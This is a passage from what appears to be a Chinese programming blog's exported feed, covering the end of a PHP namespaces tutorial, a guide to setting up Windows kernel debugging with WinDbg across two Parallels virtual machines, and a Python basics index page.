<p>可以看到，名字变得很长，那意味着以后使用Comment的时候会写上更多的代码（至少字符多了）。并且，以后如果要对各个模块增加更多的一些整合功能，或者是互相调用，发生重名的时候就需要重构名字。当然在项目开始的时候就注意到这个问题，并规定命名规则就能很好的避免这个问题。<font color="red">另一个解决方法可以考虑使用命名空间。</font></p>
<p>&amp;emsp;<br><font color="#00B2EE"><strong>注明：</strong></font><br>本文提到的常量：PHP5.3开始const关键字可以用在类的外部。const和define都是用来声明常量的（它们的区别不详述），<font color="red">但是在命名空间里，define的作用是全局的，而const则作用于当前空间。</font>我在文中提到的常量是指使用const声明的常量。</p>
<p><font color="#00B2EE"><strong>基础：</strong></font><br>命名空间将代码划分出不同的空间（区域），每个空间的常量、函数、类（为了偷懒，我下边都将它们称为元素）的名字互不影响， 这个有点类似我们常常提到的‘封装’的概念。<br>创建一个命名空间需要使用namespace关键字，这样：<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//创建一个名为<span class="string">&#x27;Article&#x27;</span>的命名空间</span><br><span class="line">namespace Article;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font color="red"><strong>要注意的是，当前脚本文件的第一个命名空间前面不能有任何代码，下面的写法都是错误的：</strong></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">//例一</span><br><span class="line">//在脚本前面写了一些逻辑代码</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$path</span> = <span class="string">&quot;/&quot;</span>;</span><br><span class="line">class Comment &#123; &#125;</span><br><span class="line">namespace Article;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">//例二</span><br><span class="line">//在脚本前面输出了一些字符</span><br><span class="line">&lt;html&gt;&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">namespace Article;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>为什么要说第一个命名空间呢？<font color="red">因为同一脚本文件中可以创建多个命名空间。</font><br>下面我创建了两个命名空间，顺便为这两个空间各自添加了一个Comment类元素：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//创建一个名为&#x27;Article&#x27;的命名空间</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Article</span>;</span><br><span class="line"><span class="comment">//此Comment属于Article空间的元素</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Comment</span> </span>&#123; &#125;</span><br><span class="line"><span class="comment">//创建一个名为&#x27;MessageBoard&#x27;的命名空间</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">MessageBoard</span>;</span><br><span class="line"><span class="comment">//此Comment属于MessageBoard空间的元素</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Comment</span> </span>&#123; &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><strong>在不同空间之间不可以直接调用其它元素，需要使用命名空间的语法：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Article</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Comment</span> </span>&#123; &#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">MessageBoard</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Comment</span> </span>&#123; &#125;</span><br><span class="line"><span class="comment">//调用当前空间（MessageBoard）的Comment类</span></span><br><span class="line"><span class="variable">$comment</span> = <span class="keyword">new</span> Comment();</span><br><span class="line"><span class="comment">//调用Article空间的Comment类</span></span><br><span class="line"><span class="variable">$article_comment</span> = <span class="keyword">new</span> \Article\Comment();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<blockquote>
<p>可以看到，在MessageBoard空间中调用article空间里的Comment类时，使用了一种像文件路径的语法： \空间名\元素名<br>除了类之外，对函数和常量的用法是一样的，下面我为两个空间创建了新的元素，并在MessageBoard空间中输出了它们的值。</p>
</blockquote>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Article;</span><br><span class="line">const PATH = <span class="string">&#x27;/article&#x27;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">getCommentTotal</span></span>() &#123;</span><br><span class="line">    <span class="built_in">return</span> 100;</span><br><span class="line">&#125;</span><br><span class="line">class Comment &#123; &#125;</span><br><span class="line"></span><br><span class="line">namespace MessageBoard;</span><br><span class="line">const PATH = <span class="string">&#x27;/message_board&#x27;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">getCommentTotal</span></span>() &#123;</span><br><span class="line">    <span class="built_in">return</span> 300;</span><br><span class="line">&#125;</span><br><span class="line">class Comment &#123; &#125;</span><br><span class="line">//调用当前空间的常量、函数和类</span><br><span class="line"><span class="built_in">echo</span> PATH; ///message_board</span><br><span class="line"><span class="built_in">echo</span> getCommentTotal(); //300</span><br><span class="line"><span class="variable">$comment</span> = new Comment();</span><br><span class="line"></span><br><span class="line">//调用Article空间的常量、函数和类</span><br><span class="line"><span class="built_in">echo</span> \Article\PATH; ///article</span><br><span class="line"><span class="built_in">echo</span> \Article\getCommentTotal(); //100</span><br><span class="line"><span class="variable">$article_comment</span> = new \Article\Comment();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>然后我的确得到了Article空间的元素数据。<br>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>子空间</strong></font><br>命名空间的调用语法像文件路径一样是有道理的，它允许我们自定义子空间来描述各个空间之间的关系。<br>抱歉我忘了说，article和message board这两个模块其实都是处于同一个blog项目内。如果用命名空间来表达它们的关系，是这样：<br></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//我用这样的命名空间表示处于blog下的article模块</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Blog</span>\<span class="title">Article</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Comment</span> </span>&#123; &#125;</span><br><span class="line"><span class="comment">//我用这样的命名空间表示处于blog下的message board模块</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Blog</span>\<span class="title">MessageBoard</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Comment</span> </span>&#123; &#125;</span><br><span class="line"><span class="comment">//调用当前空间的类</span></span><br><span class="line"><span class="variable">$comment</span> = <span class="keyword">new</span> Comment();</span><br><span class="line"><span class="comment">//调用Blog\Article空间的类</span></span><br><span class="line"><span class="variable">$article_comment</span> = <span class="keyword">new</span> \Blog\Article\Comment();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>而且，子空间还可以定义很多层次，比如说 Blog\Article\Archives\Date</p>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>公共空间</strong></font><br>我有一个common_inc.php脚本文件，里面有一些好用的函数和类：</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">getIP</span></span>() &#123; &#125;</span><br><span class="line">class FilterXSS &#123; &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS">在一个命名空间里引入这个脚本，脚本里的元素不会归属到这个命名空间。如果这个脚本里没有定义其它命名空间，它的元素就始终处于公共空间中：<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Blog\Article;</span><br><span class="line">//引入脚本文件</span><br><span class="line">include <span class="string">&#x27;./common_inc.php&#x27;</span>;</span><br><span class="line"><span class="variable">$filter_XSS</span> = new FilterXSS(); //出现致命错误：找不到Blog\Article\FilterXSS类</span><br><span class="line"><span class="variable">$filter_XSS</span> = new \FilterXSS(); //正确</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><br>调用公共空间的方式是直接在元素名称前加 \ 就可以了，否则PHP解析器会认为我想调用当前空间下的元素。除了自定义的元素，还包括PHP自带的元素，都属于公共空间。<br>要提一下，其实公共空间的函数和常量不用加 \ 也可以正常调用（不明白PHP为什么要这样做），但是为了正确区分元素，还是建议调用函数的时候加上 \</p>
<p><strong>名称术语</strong><br>在说别名和导入之前，需要知道关于空间三种名称的术语，以及PHP是怎样解析它们的。官方文档说得非常好，我就直接拿来套了。</p>
<p>1.非限定名称，或不包含前缀的类名称，例如 $comment &#x3D; new Comment();。如果当前命名空间是Blog\Article，Comment将被解析为Blog\Article\Comment。如果使用Comment的代码不包含在任何命名空间中的代码（全局空间中），则Comment会被解析为Comment。</p>
<p>2.限定名称，或包含前缀的名称，例如 $comment &#x3D; new Article\Comment();。如果当前的命名空间是Blog，则Comment会被解析为Blog\Article\Comment。如果使用Comment的代码不包含在任何命名空间中的代码（全局空间中），则Comment会被解析为Comment。</p>
<p>3.完全限定名称，或包含了全局前缀操作符的名称，例如 $comment &#x3D; new \Article\Comment();。在这种情况下，Comment总是被解析为代码中的文字名(literal name)Article\Comment。</p>
<p>其实可以把这三种名称类比为文件名（例如 comment.php）、相对路径名（例如 .&#x2F;article&#x2F;comment.php）、绝对路径名（例如 &#x2F;blog&#x2F;article&#x2F;comment.php），这样可能会更容易理解。</p>
<p>我用了几个示例来表示它们：<br></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//创建空间Blog</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Blog</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Comment</span> </span>&#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//非限定名称，表示当前Blog空间</span></span><br><span class="line"><span class="comment">//这个调用将被解析成 Blog\Comment();</span></span><br><span class="line"><span class="variable">$blog_comment</span> = <span class="keyword">new</span> Comment();</span><br><span class="line"></span><br><span class="line"><span class="comment">//限定名称，表示相对于Blog空间</span></span><br><span class="line"><span class="comment">//这个调用将被解析成 Blog\Article\Comment();</span></span><br><span class="line"><span class="variable">$article_comment</span> = <span class="keyword">new</span> Article\Comment(); <span class="comment">//类前面没有反斜杆\</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//完全限定名称，表示绝对于Blog空间</span></span><br><span class="line"><span class="comment">//这个调用将被解析成 Blog\Comment();</span></span><br><span class="line"><span class="variable">$article_comment</span> = <span class="keyword">new</span> \Blog\Comment(); <span class="comment">//类前面有反斜杆\</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//完全限定名称，表示绝对于Blog空间</span></span><br><span class="line"><span class="comment">//这个调用将被解析成 Blog\Article\Comment();</span></span><br><span class="line"><span class="variable">$article_comment</span> = <span class="keyword">new</span> \Blog\Article\Comment(); <span class="comment">//类前面有反斜杆\</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建Blog的子空间Article</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Blog</span>\<span class="title">Article</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Comment</span> </span>&#123; &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS">其实之前我就一直在使用非限定名称和完全限定名称，现在它们终于可以叫出它们的名称了。<br><strong>别名和导入</strong><br>别名和导入可以看作是调用命名空间元素的一种快捷方式。PHP并不支持导入函数或常量。<br>它们都是通过使用use操作符来实现：<br></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Blog</span>\<span class="title">Article</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Comment</span> </span>&#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个BBS空间（我有打算开个论坛）</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">BBS</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//导入一个命名空间</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">Blog</span>\<span class="title">Article</span>;</span><br><span class="line"><span class="comment">//导入命名空间后可使用限定名称调用元素</span></span><br><span class="line"><span class="variable">$article_comment</span> = <span class="keyword">new</span> Article\Comment();</span><br><span class="line"></span><br><span class="line"><span class="comment">//为命名空间使用别名</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">Blog</span>\<span class="title">Article</span> <span class="title">as</span> <span class="title">Arte</span>;</span><br><span class="line"><span class="comment">//使用别名代替空间名</span></span><br><span class="line"><span class="variable">$article_comment</span> = <span class="keyword">new</span> Arte\Comment();</span><br><span class="line"></span><br><span class="line"><span class="comment">//导入一个类</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">Blog</span>\<span class="title">Article</span>\<span class="title">Comment</span>;</span><br><span class="line"><span class="comment">//导入类后可使用非限定名称调用元素</span></span><br><span class="line"><span class="variable">$article_comment</span> = <span class="keyword">new</span> Comment();</span><br><span class="line"></span><br><span class="line"><span class="comment">//为类使用别名</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">Blog</span>\<span class="title">Article</span>\<span class="title">Comment</span> <span class="title">as</span> <span class="title">Comt</span>;</span><br><span class="line"><span class="comment">//使用别名代替空间名</span></span><br><span class="line"><span class="variable">$article_comment</span> = <span class="keyword">new</span> Comt();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>我注意到，如果导入元素的时候，当前空间有相同的名字元素将会怎样？显然结果会发生致命错误。<br>例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Blog\Article;</span><br><span class="line">class Comment &#123; &#125;</span><br><span class="line"></span><br><span class="line">namespace BBS;</span><br><span class="line">class Comment &#123; &#125;</span><br><span class="line">Class Comt &#123; &#125;</span><br><span class="line"></span><br><span class="line">//导入一个类</span><br><span class="line">use Blog\Article\Comment;</span><br><span class="line"><span class="variable">$article_comment</span> = new Comment(); //与当前空间的Comment发生冲突，程序产生致命错误</span><br><span class="line"></span><br><span class="line">//为类使用别名</span><br><span class="line">use Blog\Article\Comment as Comt;</span><br><span class="line"><span class="variable">$article_comment</span> = new Comt(); //与当前空间的Comt发生冲突，程序产生致命错误</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><strong>动态调用</strong><br>PHP提供了namespace关键字和__NAMESPACE__魔法常量动态的访问元素，__NAMESPACE__可以通过组合字符串的形式来动态访问：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Blog</span>\<span class="title">Article</span>;</span><br><span class="line"><span class="keyword">const</span> PATH = <span class="string">&#x27;/Blog/article&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Comment</span> </span>&#123; &#125;</span><br><span class="line"><span class="comment">//namespace关键字表示当前空间</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">namespace</span>\<span class="title">PATH</span>; <span class="comment">///Blog/article</span></span><br><span class="line"><span class="variable">$comment</span> = <span class="keyword">new</span> <span class="keyword">namespace</span>\<span class="title">Comment</span>();</span><br><span class="line"><span class="comment">//魔法常量__NAMESPACE__的值是当前空间名称</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">__NAMESPACE__</span>; <span class="comment">//Blog\Article</span></span><br><span class="line"><span class="comment">//可以组合成字符串并调用</span></span><br><span class="line"><span class="variable">$comment_class_name</span> = <span class="keyword">__NAMESPACE__</span> . <span class="string">&#x27;\Comment&#x27;</span>;</span><br><span class="line"><span class="variable">$comment</span> = <span class="keyword">new</span> <span class="variable">$comment_class_name</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>字符串形式调用问题<br>上面的动态调用的例子中，我们看到了字符串形式的动态调用方式，如果要使用这种方式要注意两个问题。<br><font color="red"><strong>1. 使用双引号的时候特殊字符可能被转义</strong></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Blog\Article;</span><br><span class="line">class name &#123; &#125;</span><br><span class="line">//我是想调用Blog\Article\name</span><br><span class="line"><span class="variable">$class_name</span> = __NAMESPACE__ . <span class="string">&quot;\name&quot;</span>; //但是\n将被转义为换行符</span><br><span class="line"><span class="variable">$name</span> = new <span class="variable">$class_name</span>(); //发生致命错误</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font color="red"><strong>2. 不会认为是限定名称</strong></font><br>PHP在编译脚本的时候就确定了元素所在的空间，以及导入的情况。而在解析脚本时字符串形式调用只能认为是非限定名称和完全限定名称，而永远不可能是限定名称。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Blog</span>;</span><br><span class="line"><span class="comment">//导入Common类</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">Blog</span>\<span class="title">Article</span>\<span class="title">Common</span>;</span><br><span class="line"><span class="comment">//我想使用非限定名称调用Blog\Article\Common</span></span><br><span class="line"><span class="variable">$common_class_name</span> = <span class="string">&#x27;Common&#x27;</span>;</span><br><span class="line"><span class="comment">//实际会被当作非限定名称，也就表示当前空间的Common类，但我当前类没有创建Common类</span></span><br><span class="line"><span class="variable">$common</span> = <span class="keyword">new</span> <span class="variable">$common_class_name</span>(); <span class="comment">//发生致命错误：Common类不存在</span></span><br><span class="line"><span class="comment">//我想使用限定名称调用Blog\Article\Common</span></span><br><span class="line"><span class="variable">$common_class_name</span> = <span class="string">&#x27;Article\Common&#x27;</span>;</span><br><span class="line"><span class="comment">//实际会被当作完全限定名称，也就表示Article空间下的Common类，但我下面只定义了Blog\Article空间而不是Article空间</span></span><br><span class="line"><span class="variable">$common</span> = <span class="keyword">new</span> <span class="variable">$common_class_name</span>(); <span class="comment">//发生致命错误：Article\Common类不存在</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Blog</span>\<span class="title">Article</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Common</span> </span>&#123; &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Parallels+Windbg+Win7+WinXP搭建双机调试</title>
    <url>/post/Parallels-Windbg-Win7-WinXP/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ  ɔ: </p>
<span id="more"></span>

<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1 前言"></a>1 前言</h2><p>网上教程基本都是VmWare通过命名管道的串口方式进行双机调试的环境搭建。条件不允许，手头只有Parallels和VmWare Fusion。Parallels搭建双机调试的教程Google没有找到。于是自己摸索了记录一下（着急就看下一章开始使用）。</p>
<p>先做定义（参见<a href="https://docs.microsoft.com/zh-cn/windows-hardware/drivers/debugger/performing-kernel-mode-debugging-using-windbg">使用 WinDbg 进行实时内核模式调试</a>）：</p>
<ul>
<li>用来做调试的机器：<strong>主计算机</strong></li>
<li>被调试的机器：<strong>目标计算机</strong></li>
</ul>
<p>为了方便，许多人使用以下2种方式搭建：</p>
<ol>
<li>VmWare下，搭建2个虚拟机，Windows7+Win XP，然后使用串口的命名管道方式进行通信；</li>
<li>VmWare下，主计算机为Windows7，Windows7中安装VmWare然后装一个Win XP，使用串口的命名管道方式进行通信；</li>
<li>主计算机为本机（非虚拟机），目标计算机为虚拟机。</li>
</ol>
<p>上述方式2下会遇到的几个问题：</p>
<ol>
<li>虚拟机中装虚拟机会导致主计算机性能降低。我给了VmWare Fusion 8G内存4核心，在装Win XP时仍然很卡；</li>
<li>虚拟机中装虚拟机会提示“Intel VT-x处于禁用状态”，处理方法：<ul>
<li>需要进入主计算机系统的BIOS，选中“Intel （R）Virtualization Technology”，设为启用“Enabled”；</li>
<li>但上述方式2的主计算机是虚拟机，无法进入BIOS。VmWare可以在设置中“CPU与内存”中高级设置勾选上允许虚拟化即可。PD要在Pro版本下面才可以设置。</li>
</ul>
</li>
</ol>
<div class="note default"><p>为什么要用Parallels Desktop而非VmWare Fusion：</p>
<ul>
<li>PD能够使鼠标无缝衔接，无须按Control+Command（VmWare Fusion太烦了每次都要切换鼠标）；</li>
<li>PD的流畅度可以做到和实体机一样，哪怕只分给虚拟机很少的内存和CPU（PD下的Win7给2CPU+2G，运行VS2019、OD、Chrome、VC++6很流畅）；</li>
</ul>
</div>

<h2 id="2-Parallels搭建双机调试环境"><a href="#2-Parallels搭建双机调试环境" class="headerlink" title="2 Parallels搭建双机调试环境"></a>2 Parallels搭建双机调试环境</h2><p>基础环境：</p>
<ul>
<li>macOS Monterey 12.0.1</li>
<li>Parallels Desktop 16.0.1（Monterey目前不支持PD17）</li>
<li>Windows 7 Professional SP3.iso</li>
<li>Windows XP Professional SP3.iso</li>
<li>WDK7600（自带Windbg）</li>
<li>调试符号的安装程序</li>
</ul>
<p>搭建场景：</p>
<p>由于手残，将系统升级到了Monterey，但是之前的皇帝版PD17不能用了，网上看了一圈，仅商业版的PD16.0.1可用，那就不能处理“Intel VT-x处于禁用状态”这样提示了，也就是暂时不能在虚拟机中安装虚拟机了。故采用一下方案：</p>
<ul>
<li>使用PD安装2个虚拟机，主计算机为Windows7，目标计算机为Windows XP。</li>
</ul>
<h3 id="2-1-安装Win-XP"><a href="#2-1-安装Win-XP" class="headerlink" title="2.1 安装Win XP"></a>2.1 安装Win XP</h3><ol>
<li><p>Windows XP中修改C盘根目录下的隐藏文件<code>boot.ini</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[boot loader]</span><br><span class="line">timeout=<span class="number">30</span></span><br><span class="line"><span class="keyword">default</span>=multi(<span class="number">0</span>)disk(<span class="number">0</span>)rdisk(<span class="number">0</span>)partition(<span class="number">1</span>)\WINDOWS</span><br><span class="line">[operating systems]</span><br><span class="line">multi(<span class="number">0</span>)disk(<span class="number">0</span>)rdisk(<span class="number">0</span>)partition(<span class="number">1</span>)\WINDOWS=<span class="string">&quot;Microsoft Windows XP Professional&quot;</span> /noexecute=optin /fastdetect</span><br><span class="line">multi(<span class="number">0</span>)disk(<span class="number">0</span>)rdisk(<span class="number">0</span>)partition(<span class="number">1</span>)\WINDOWS=<span class="string">&quot;Debug&quot;</span> /noexecute=optin /fastdetect /debug /debugport=com1</span><br></pre></td></tr></table></figure>

<ul>
<li><p>串口的名称为：<strong>com1</strong>（只能填com1，PD无法识别com2）</p>
<p><img data-src="https://s2.loli.net/2021/12/25/CinvZQTtueVREja.png" alt="1.png"></p>
</li>
</ul>
<ol>
<li>硬件 – “+” – 串行口 – 源：名称为<code>com1</code></li>
<li>模式：客户端（必须是客户端，Win7为服务器端，不同于VmWare）</li>
</ol>
</li>
</ol>
<h3 id="2-2-安装Win7"><a href="#2-2-安装Win7" class="headerlink" title="2.2 安装Win7"></a>2.2 安装Win7</h3><ol>
<li><p>安装WDK，找到Windbg.exe并创建快捷方式到桌面，路径：<code>C:\WinDDK\7600.16385.1\Debuggers\windbg.exe</code>。</p>
</li>
<li><p>安装对应的Windows调试符号程序。（以默认安装路径安装，否则后续较麻烦）</p>
</li>
<li><p>给Windbg添加启动参数：</p>
<p>右键 – 属性 – <code>C:\WinDDK\7600.16385.1\Debuggers\windbg.exe -b -k com:port=com1,baud=115200,reconnect -y</code></p>
</li>
<li><p>打开Windbg，添加调试符号路径：File – Symbol File Path添加：</p>
<p><code>C:/WINDOWS/Symbols;srv*C:/WINDOWS/Symbols*http://msdl.microsoft.com/download/symbols;</code> ，然后<code>reload</code>。</p>
</li>
<li><p>关机后添加串口如下图。</p>
<p><img data-src="https://s2.loli.net/2021/12/25/3tdNShQs7bYZoiP.png" alt="2.png"></p>
</li>
</ol>
<h3 id="2-3-虚拟机启动-x2F-关闭顺序"><a href="#2-3-虚拟机启动-x2F-关闭顺序" class="headerlink" title="2.3 虚拟机启动&#x2F;关闭顺序"></a>2.3 虚拟机启动&#x2F;关闭顺序</h3><p>启动顺序：</p>
<ol>
<li>启动Win7，打开桌面的Windbg。</li>
<li>启动Win XP。</li>
</ol>
<p>中止顺序：</p>
<ol>
<li>Win XP。</li>
<li>Win7。</li>
</ol>
]]></content>
      <categories>
        <category>笔记</category>
        <category>Windows内核</category>
      </categories>
      <tags>
        <tag>内核</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-基础</title>
    <url>/post/Python-Basics/</url>
    <content><![CDATA[<p>从今天开始Python的学习吧……ヾ(๑╹◡╹)ﾉ”</p>
<span id="more"></span>
<p>本文参考：<br><font color="#00B2EE">[<a href="http://www.runoob.com/python3/python3-tutorial.html">Python3 教程</a>]</font><br><font color="#00B2EE">[<a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001431658624177ea4f8fcb06bc4d0e8aab2fd7aa65dd95000">廖雪峰的官方网站Python教程</a>]</font><br><font color="#00B2EE">[<a href="http://www.ituring.com.cn/book/tupubarticle/10626">Python编程：从入门到实践</a>]</font><br><font color="#00B2EE">[<a href="http://www.pythondoc.com/">Python 中文学习大本营-Python 3.6.X 官方教程</a>]</font></p>
<p>&amp;ensp;<br>&amp;ensp;</p>
<center><font color="#00B2EE" face="Comic sans MS" size=5>Python 基础</font> </center>



<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="一-基础语法"><a href="#一-基础语法" class="headerlink" title="一. 基础语法"></a><font color="#FF6347" face="Comic sans MS">一. 基础语法</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-Grammar">Python-基础语法</a>]</strong></font><br></font></p>
<br>

<br>

<h3 id="二-变量和数据类型"><a href="#二-变量和数据类型" class="headerlink" title="二. 变量和数据类型"></a><font color="#FF6347" face="Comic sans MS">二. 变量和数据类型</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-Variables-DataTypes">Python-变量和数据类型</a>]</strong></font><br></font></p>
<br>

<br>

<h3 id="三-运算符"><a href="#三-运算符" class="headerlink" title="三. 运算符"></a><font color="#FF6347" face="Comic sans MS">三. 运算符</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-Operators">Python-运算符</a>]</strong></font><br></font></p>
<br>

<br>

<h3 id="四-条件语句与循环"><a href="#四-条件语句与循环" class="headerlink" title="四. 条件语句与循环"></a><font color="#FF6347" face="Comic sans MS">四. 条件语句与循环</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-ConditionalStatements-loops">Python-条件语句与循环</a>]</strong></font><br></font></p>
<br>

<br>

<h3 id="五-字符编码、字符串、格式化"><a href="#五-字符编码、字符串、格式化" class="headerlink" title="五. 字符编码、字符串、格式化"></a><font color="#FF6347" face="Comic sans MS">五. 字符编码、字符串、格式化</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-Coding">Python-字符编码&amp;字符串&amp;格式化</a>]</strong></font><br></font></p>
<br>

<br>

<h3 id="六-列表、元组、字典、集合"><a href="#六-列表、元组、字典、集合" class="headerlink" title="六. 列表、元组、字典、集合"></a><font color="#FF6347" face="Comic sans MS">六. 列表、元组、字典、集合</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-list-tuple-dict-set">Python-列表、元组、字典、集合</a>]</strong></font><br></font></p>
<br>

<br>

<h3 id="七-函数"><a href="#七-函数" class="headerlink" title="七. 函数"></a><font color="#FF6347" face="Comic sans MS">七. 函数</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-Function">Python-函数</a>]</strong></font><br></font></p>
<br>

<br>

<h3 id="八-生成器与迭代器"><a href="#八-生成器与迭代器" class="headerlink" title="八. 生成器与迭代器"></a><font color="#FF6347" face="Comic sans MS">八. 生成器与迭代器</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-generator-iterator">Python-生成器与迭代器</a>]</strong></font><br></font></p>
<br>

<br>

<h3 id="九-模块和包"><a href="#九-模块和包" class="headerlink" title="九. 模块和包"></a><font color="#FF6347" face="Comic sans MS">九. 模块和包</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-Modules-Packages">Python-模块和包</a>]</strong></font><br></font></p>
<br>

<br>

<h3 id="十-函数式编程"><a href="#十-函数式编程" class="headerlink" title="十. 函数式编程"></a><font color="#FF6347" face="Comic sans MS">十. 函数式编程</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-FunctionalProgramming">Python-函数式编程</a>]</strong></font><br></font></p>
<br>

<br>

